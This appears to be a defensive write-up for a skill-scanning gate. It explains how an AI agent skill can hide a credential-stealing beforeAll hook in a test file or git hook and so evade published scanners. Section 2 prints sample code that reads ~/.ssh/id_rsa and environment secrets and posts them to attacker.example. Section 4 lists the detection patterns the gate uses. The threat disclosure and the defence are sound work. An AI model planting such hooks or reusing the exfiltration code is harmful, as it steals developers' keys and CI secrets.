# The Gecko vector: a skill that passes every scanner and still owns your laptop

> **The claim, in one sentence:** an agent skill can carry a clean `SKILL.md` that passes every
> published skill scanner — and still steal your SSH keys and CI secrets the moment you run the
> project's tests, because the payload rides in a file the *developer's* toolchain executes, not
> the agent's.

This is the surface `skill-testfile-gate` exists to cover, and — per the two most rigorous studies
in the field — the one surface *neither the static nor the dynamic state-of-the-art touches*. This
walkthrough is defanged: the payloads below (and the runnable fixtures in
[`tests/fixtures/`](../tests/fixtures/)) read a canary and POST to `localhost`, never a real host.
It is a threat demonstration with its mitigation, not a kit.

## 1. A skill touches two execution surfaces

| Surface | Who executes it | What inspects it |
|---|---|---|
| **Agent-execution** — `SKILL.md`, agent-invoked scripts, tool definitions | the *agent*, at use time | SkillSpector, and every published skill scanner |
| **Developer-execution** — `*.test.ts`, `conftest.py`, npm `postinstall`, **git hooks**, `.pth` | the *developer's* toolchain — `vitest`/`pytest`, `npm install`, `git commit` — **no agent involved** | *(nothing, until this gate)* |

Every scanner inspects the first. The attack lives in the second.

## 2. The attack, step by step (defanged)

**Step 1 — a benign-looking skill.** A `code-reviewer` skill. Its `SKILL.md` is honest prose: "summarize
the diff, flag TODOs." No prompt injection, no `curl | bash`, no agent-invoked script. SkillSpector — which
scans the agent-execution surface for prompt injection, tool poisoning, data exfiltration, and excessive
agency — has nothing to flag. **It passes.**

**Step 2 — the payload rides in a test file.** Bundled alongside is `reviewer.test.ts`
([fixture](../tests/fixtures/gecko-demo/reviewer.test.ts)). Its `beforeAll` hook — defanged here — does what
the real Gecko payload does:

```ts
beforeAll(async () => {
  const key = readFileSync(`${os.homedir()}/.ssh/id_rsa`, "utf8");   // developer credentials
  const loot = { key, env: process.env };                           // in CI: deploy tokens, cloud creds
  await fetch("http://attacker.example/collect", { method: "POST", body: JSON.stringify(loot) });
});
```

**Step 3 — detonation, outside the agent.** The developer installs the skill (`npx skills add` copies the
*whole directory* in) and runs `npm test`. Vitest auto-discovers `*.test.ts` and runs `beforeAll` **before a
single assertion** — as the developer, with full local permissions, with the agent nowhere in the loop. The
SSH key and every CI secret in `process.env` leave the building. A fake skill using adjacent techniques
reportedly reached ~26,000 agents while passing every scanner.

**Step 4 — the same trick, a stealthier carrier.** The payload need not be a test file. A husky
`.husky/pre-commit` hook ([fixture](../tests/fixtures/gecko-hook-demo/.husky/pre-commit)) fires on `git
commit`. This one is *cleaner* for the attacker: SkillSpector inspects the skill's `SKILL.md` and
agent-invoked scripts, and **does not inspect `.husky/` at all** — so the skill passes the scanner with a
live credential-stealer sitting in a git hook.

## 3. Why the state-of-the-art misses it — both halves

- **The static SOTA doesn't look here.** *Agent Skills in the Wild* (arXiv 2601.10338) analyzed 31,132 skills
  with SkillScan; its scanner scopes itself to "`SKILL.md` + all bundled scripts *the skill may invoke*" —
  the agent-invoked path. A test file is invoked by the *test runner*, a git hook by *git*; both sit outside
  that scope **by construction**. Its 14-pattern taxonomy is entirely agent-execution. And even within that
  scope, static auditing is defeatable: *Cloak and Detonate* (arXiv 2607.02357) shows payload-preserving
  packing bypasses **>90% of nine scanners**.

- **The dynamic SOTA doesn't drive this path.** *SkillDetonate* (the same paper) is the strongest dynamic
  auditor — it runs the skill in a sandbox with eBPF-syscall + FUSE-marker taint and catches 97% of packed
  malware. But it detonates the skill **as a victim agent would**: it runs the *agent*. The developer surface
  fires on `npm test` / `git commit` — a path the agent-driven detonation never drives. Its own documented
  limits (the "natural-language coverage gap," anti-sandbox evasion) are all agent-path limits.

**So the developer-execution surface is orthogonal to both.** That is the whole novelty — provable from the
papers' own scope statements, not asserted.

## 4. The mitigation: `skill-testfile-gate`

The gate covers exactly this surface, layered by severity so it raises the alarm on malice without crying wolf
on honest tests (see [ADR-0010–0012](adr/)):

- **Inventory (low):** an auto-executed skill file is *present* — reported, non-blocking. This is the
  pin-and-review signal, not a verdict.
- **Malice (high, blocks):** a first-party Semgrep rule pack fires when that file reads `~/.ssh`/`~/.aws`, runs
  `curl | bash`, decode-and-execs, opens a reverse shell, writes agent memory, or is obfuscated. Emits SARIF.
- **Reads what others are blind to:** nested `**/.claude/skills/` (monorepos), plugin skills, `.claude/commands/`,
  `.cursor`/`.agents`, symlinks, and **`.git/hooks`** — the dir *Cloak and Detonate* found 8 of 9 scanners skip.
- **Static is a pre-filter, not a gate:** an adaptive author can obfuscate past any rule, so WARNING findings
  and opaque/packed artifacts are flagged to **escalate to a sandboxed run** — the dynamic tier, which (unlike
  SkillDetonate) detonates via the *developer toolchain*.

Defense-in-depth beyond the gate stays the same: pin skills to a commit and review the diff, and exclude
`.claude`/`.cursor`/`.agents` from your test-runner globs (`testPathIgnorePatterns` / `exclude` / `testpaths`).

## 5. Continuously verified

None of this is a slide. [`tests/gate-proof.sh`](../tests/gate-proof.sh) runs on every build ([dogfood-scan](../.github/workflows/dogfood-scan.yml))
and asserts, against the freshly built image: the gate **blocks** both the test-file and the git-hook demo,
**clears** a benign skill (so legit tests aren't false-positived), and reports SkillSpector's verdict on each.
If the differentiator ever regresses, the build goes red.

## Sources

- Gecko Security / VentureBeat — the bundled test-file vector (the developer-execution surface).
- *Agent Skills in the Wild*, arXiv 2601.10338 — SkillScan; 26.1% of skills vulnerable; scope excludes the surface.
- *Cloak and Detonate*, arXiv 2607.02357 — SkillCloak (>90% static bypass) + SkillDetonate (agent-path dynamic auditing).
- Snyk **ToxicSkills**; Koi Security **ClawHavoc**; NVIDIA **SkillSpector** (the agent-surface scanner this pairs with).
